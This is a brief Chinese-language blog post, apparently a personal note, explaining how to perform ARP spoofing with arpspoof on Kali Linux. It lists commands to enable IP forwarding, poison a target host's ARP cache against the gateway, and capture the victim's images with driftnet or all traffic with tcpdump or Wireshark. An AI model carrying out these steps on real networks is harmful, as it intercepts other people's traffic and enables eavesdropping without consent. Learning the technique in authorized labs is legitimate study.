---
title: Kali arpspoof
date: 2018-12-20 09:10:53
categories:
  - 电脑使用
tags:
  - Linux
---
spoof	英[spu:f] n.	哄骗; 讽刺; 戏弄; （进行） 滑稽的模仿;

# arpspoof使用 #

启用IP转发(不转发会导致受害者主机无法访问网络)

	echo 1 >> /proc/sys/net/ipv4/ip_forward

启动arpspoof。Usage: arpspoof [-i interface] [-t target] host(网关ip)

	arpspoof -i eth0 -t 192.168.1.5 192.168.1.1

捕获图片请求(另开一个终端)

	driftnet -i eth0

也可以使用tcpdump或Wireshark工具截获所有流量

说明：可以通过 `arp` 命令分别查看攻击者和受害者主机的arp缓存表来理解arp欺骗



